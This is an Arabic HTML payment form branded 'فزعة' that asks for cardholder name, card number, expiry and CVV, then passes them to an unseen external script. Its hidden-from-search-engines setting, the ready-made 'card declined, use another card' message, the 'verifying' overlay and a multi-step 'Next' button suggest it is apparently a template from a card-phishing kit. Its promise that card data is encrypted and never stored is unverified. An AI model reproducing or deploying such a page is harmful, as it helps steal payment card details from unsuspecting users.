<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>بيانات البطاقة البنكية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style-payment.css">
</head>
<body>
    <div class="app">
        <div class="payment-shell">
            <header>
                <div class="logo">
                    <img class="logo-mark" src="assets/images/logo.png" alt="فزعة">
                </div>
            </header>

            <main>
                <form autocomplete="off" novalidate id="payment-form">
                    <!-- Decline Box (Hidden by default) -->
                    <div class="decline-box" id="declineBox">
                        <div class="decline-copy">
                            <div class="decline-head">
                                <div class="decline-icon">
                                    <i class="fas fa-times-circle"></i>
                                </div>
                                <div class="decline-title" id="declineTitle">تم رفض البطاقة</div>
                            </div>
                            <div class="decline-sub" id="declineSub">عذراً، لم يتم قبول بطاقتك الائتمانية</div>
                            <div class="decline-hint">
                                <div class="decline-hint-text" id="declineHintText">💳 يرجى استخدام بطاقة أخرى أو اختيار وسيلة دفع بديلة</div>
                            </div>
                        </div>
                    </div>

                    <!-- Card Holder Name -->
                    <div class="field">
                        <label class="label" for="cardHolderName">اسم حامل البطاقة</label>
                        <input id="cardHolderName" type="text" placeholder="اسم حامل البطاقة">
                        <div class="card-error" id="cardHolderError"></div>
                    </div>

                    <!-- Card Number -->
                    <div class="field">
                        <label class="label" for="cardNumber">رقم البطاقة</label>
                        <div class="card-field-wrapper" id="cardFieldWrap">
                            <input id="cardNumber" class="card-input" type="tel" inputmode="numeric" placeholder="" maxlength="19">
                            <div class="card-logos">
                                <i class="fa-solid fa-credit-card" id="genericCardIcon"></i>
                                <i class="fa-brands fa-cc-visa" id="visaIcon"></i>
                                <img id="masterIcon" src="assets/images/Mastercard.svg" alt="">
                            </div>
                            <div class="card-error" id="cardNumberError"></div>
                        </div>
                    </div>

                    <!-- Expiry & CVV Row -->
                    <div class="expiry-cvv-row">
                        <div class="field">
                            <label class="label" for="expiryInput">تاريخ الانتهاء</label>
                            <div class="expiry-field" id="expiryFieldWrap">
                                <input id="expiryInput" class="card-input" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5">
                                <div class="card-error expiry-error" id="expiryError"></div>
                            </div>
                        </div>
                        <div class="field">
                            <label class="label" for="cvv">
                                رمز الأمان (CVV)
                                <i class="fas fa-lock"></i>
                            </label>
                            <input id="cvv" class="card-input" type="tel" inputmode="numeric" placeholder="" maxlength="3">
                            <div class="card-error" id="cvvError"></div>
                        </div>
                    </div>

                    <!-- Secure Notice -->
                    <div class="secure-notice">
                        <i class="fas fa-shield-halved"></i>
                        <span>جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.</span>
                    </div>

                    <!-- Submit Button -->
                    <div class="buttons-row">
                        <button type="submit" class="btn btn-primary">
                            <span id="btnText">التالي</span>
                        </button>
                    </div>
                </form>
            </main>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-card">
            <div class="loading-spinner"></div>
            <span id="loadingText">جاري التحقق من المعلومات، يرجى الانتظار...</span>
        </div>
    </div>

    <script src="script-payment.js"></script>
</body>
</html>
